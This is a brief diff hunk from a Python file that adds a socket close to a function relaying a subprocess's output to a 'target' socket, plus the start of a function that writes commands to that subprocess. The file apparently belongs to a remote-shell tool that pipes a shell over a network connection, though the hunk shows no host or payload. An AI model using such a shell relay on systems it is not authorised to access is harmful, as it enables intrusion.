@@ -30,7 +30,9 @@ def response(target: socket.socket, process: subprocess.Popen) -> None:
                 pass
             except Exception as e:
                 if not silentMode: print(f"[!] (response) exception: {e}")
-
+    
+    target.close()
+    
 def sendcommand(process: subprocess.Popen, command):
     try:
         process.stdin.write(command + b'\n')
